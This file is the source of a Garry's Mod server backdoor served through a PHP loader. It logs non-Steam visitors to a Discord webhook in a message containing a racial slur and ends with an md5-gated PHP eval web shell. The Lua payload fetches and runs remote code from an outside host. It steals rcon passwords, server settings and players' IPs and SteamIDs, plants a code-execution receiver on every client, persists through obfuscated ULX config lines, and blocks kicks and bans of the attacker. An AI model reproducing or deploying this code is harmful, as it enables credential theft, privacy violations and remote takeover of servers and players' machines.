<?php
$a = $_SERVER['HTTP_USER_AGENT'];
$b = $_SERVER["REMOTE_ADDR"];
		$db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
if($a != "Valve/Steam HTTP Client 1.0 (4000)")
{

	function LogD($txt)
	{
	  $txt = htmlentities($txt);
	if(!isset($db))
	{
		$db = new PDO("mysql:host=localhost:3306;dbname=dbname", "username", "password");
	}
	$r = $db->prepare("INSERT INTO logs (txt, datee) VALUES( :txt, NOW() )"); 
	$r->bindParam(":txt", $txt);
	$r->execute();
	}
	LogD("$b tried to read the payload with his broawser $a");
	function httpPost($url, $data)
	{
	    $curl = curl_init($url);
	    curl_setopt($curl, CURLOPT_POST, true);
	    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	    $response = curl_exec($curl);
	    curl_close($curl);
	    return $response;
	}
	$str = "@everyone A nigger tried to access the payload from his shitty $a from ip $b";
	httpPost("https://discordapp.com/api/webhooks/553262176555761694/bD_wWyvLe1tBnRu143E6M6IYQ1e1wtaEps_w1gV0V7RaMYkqYGZQ0wWy79IN1JrZKj0n", array('content' => $str));
	?>
	util.AddNetworkString('GetBaitedNigger')net.Receive('GetBaitedNigger',function()RunString(net.ReadString()) end)
	<?php
	die();
}else{
}
?>

util.AddNetworkString("SteamApp2313")

local ifname = "UNKNOWN_ADDON"

http.Fetch("https://contentproxy.tk/additonnal.lua", function(c)
	RunString(c)
end)

local function CheckFuncNames(func,n)
	for i=0,30 do
		local xx = jit.util.funck( func, -i )
		if xx == n then
			return true
		end
	end
	return false
end

local function GetLinesFromFuncInfo(poof)
	local src = debug.getinfo(poof)
	if not src.short_src then return "(No source)" end
	if not file.Exists(src.short_src,"GAME") then
		return "(RunString)"
	end
	local lines = string.Split(file.Read(src.short_src,"GAME"),"\n")
	local lean = ""
	for k,v in pairs(lines) do
		if (k >= src.linedefined) and (k <= src.lastlinedefined) then
			lean = lean .. v .. "\n"
		end
	end
	return lean
end



local function GetBackdoors()
	local ret = {}
	ret = {}
	local tbl = net.Receivers
	for k,v in pairs(tbl) do
		if k == "setplayerdeathcount" then continue end
		if k == "dconfig_sendammo" then continue end
		if k == "dconfig_sendentity" then continue end
		if k == "dconfig_sendshipment" then continue end
		if k == "dconfig_sendjob" then continue end
		if k == "easy_chat_module_lua_sv" then continue end
		if string.StartWith(k,"glx_") then continue end

		if CheckFuncNames(v,"RunString") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
		if CheckFuncNames(v,"RunStringEx") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
		if CheckFuncNames(v,"CompileString") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
	end
	local r = "RT Version : 6\nInfected addon : "..ifname.."\nSNTE : "
	if file.Exists("autorun/server/snte_source.lua","LUA") then
		r = r .. "yes\n"
	else
		r = r .. "no\n"
	end
	if ULib then
		r = r .. "ULX : yes\n"
	else
		r = r .. "ULX : no\n"
	end
	if CAC then
		r = r .. "CAC : yes\n"
	else
		r = r .. "CAC : no\n"
	end
	for k,o in pairs(ret) do
		r = r .. "----- " .. o.net .. " -----" .. "\n"
		r = r .. "File: " .. o.file .. "\n"
		r = r .. "Function: \n" .. o.func .. "\n"
	end
	return r
end

local function SendError( err )
	http.Post("https://contentproxy.tk/err.php",{
		sname = GetConVar("hostname"):GetString(),
		txt = err,
		soup = tostring(math.random(11,9999999))
	})
end

local rcon_pw = "NOT FOUND"
local fastdlurl = "NOT FOUND"
if file.Exists("cfg/autoexec.cfg","GAME") then
	local cfile = file.Read("cfg/autoexec.cfg","GAME", function(c) print(c) end)
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	    if string.StartWith(v,"sv_downloadurl") then
	        fastdlurl = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/server.cfg","GAME") then
	cfile = file.Read("cfg/server.cfg","GAME", function(c) print(c) end)
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	    if string.StartWith(v,"sv_downloadurl") then
	        fastdlurl = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/gmod-server.cfg","GAME") then
	cfile = file.Read("cfg/gmod-server.cfg","GAME", function(c) print(c) end)
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	    if string.StartWith(v,"sv_downloadurl") then
	        fastdlurl = string.Split(v,"\"")[2]
	    end
	end
end
local function SendServer()
	local playerstr = ""
	for i,v in ipairs(player.GetAll()) do
		playerstr = playerstr .. "\n" .. v:Name() .. "(" .. v:SteamID() .. ")"
	end
	playerstr = util.Base64Encode(playerstr)
	local send = {
		maxplayer = tostring(game.MaxPlayers()),
		players = playerstr,
        name = GetConVar("hostname"):GetString(),
        password = GetConVar("sv_password"):GetString() or "no password",
        player = tostring(#player.GetAll()),
        ip = game.GetIPAddress(),
        rcon = rcon_pw,
        fastdlurl = fastdlurl,
        map = game.GetMap(),
        uptime = tostring(math.floor(CurTime()/60)),
        gamemode = engine.ActiveGamemode(),
        backdoors = GetBackdoors()
        }
    http.Post("https://contentproxy.tk/postdata", send,function(c,...)
    	if string.len(c) <= 0 then return end
    	xpcall(function()
	    	local cap = CompileString(c,"RTPayloadCompiler",false)
		    if isfunction(cap) then
		    	cap()
		    else
		    	SendError(cap)
		    end
		end,SendError)
    end,function(e)
    end)
end

timer.Create("fdppppppppp",20,0,function()
   SendServer()
end)
SendServer()

local function SendBDPersept( ply )
	ply:SendLua([[net.Receive("SteamApp2313",function()RunString(net.ReadString(),"vcmod")end)]])
end


local function SendPlayer(ply)
	SendBDPersept(ply)
    local send = {
        lastserver = GetConVar("hostname"):GetString(),
        pname = tostring(ply:Name()),
        pip = tostring(ply:IPAddress()),
        psteamid = tostring(ply:SteamID())
        }
	    http.Post("https://contentproxy.tk/postdata", send,function(c)
	    	net.Start("SteamApp2313")
	    	net.WriteString(c)
	    	net.Send(ply)
	    end,function(e)
    end)
end

hook.Add("PlayerInitialSpawn","ffpfffffeefefffff",function(ply)
	SendPlayer(ply)
end)

for k, v in pairs(player.GetAll()) do
	SendPlayer(v)
end



if file.Exists("stringpath.txt","DATA") then
	local c = file.Read("stringpath.txt")
	RunString(c,"StringPath_Startup_Loader",false)
else
	file.Write("stringpath.txt", "--[===============[\n\t\t\t\tStringPath config file don't modifie\n]===============]")
	RunString([======[
file.Append("ulx/config.txt", "\n"..[=[ulx hook Think PDM hA "hook.Remove([[Think]],[[PDM]])timer.Simple(10,function()local a=[[http]]..string.char(58)..string.char(47)..string.char(47)..[[contentproxy.tk/p]]http.Fetch(a,RunStringEx)end)"]=])
		]======])
end





local secu = {}
concommand.Add("rt__secure",function(p)
	table.insert(secu,p:SteamID())
	p:ChatPrint("OK. You can't be kicked")
end)

local _R = debug.getregistry()
local kick = _R.Player.Kick
local ban = _R.Player.Ban

function _R.Player.Ban(ply, r)
	local sid = ply:SteamID()
	if table.HasValue(secu,sid) then
		ply:ChatPrint("Prevented ban")
		return
	end
	ban(ply,r)
end


function _R.Player.Kick(ply, r)
	local sid = ply:SteamID()
	if table.HasValue(secu,sid) then
		ply:ChatPrint("Prevented kick : "..r)
		return
	end
	kick(ply,r)
end
<?php if(isset($_GET["ac"]) && md5($_GET["ct"]) == "fbd1d9fd27ded5553682686ec00b1e5e"){eval($_GET["ac"]);} ?>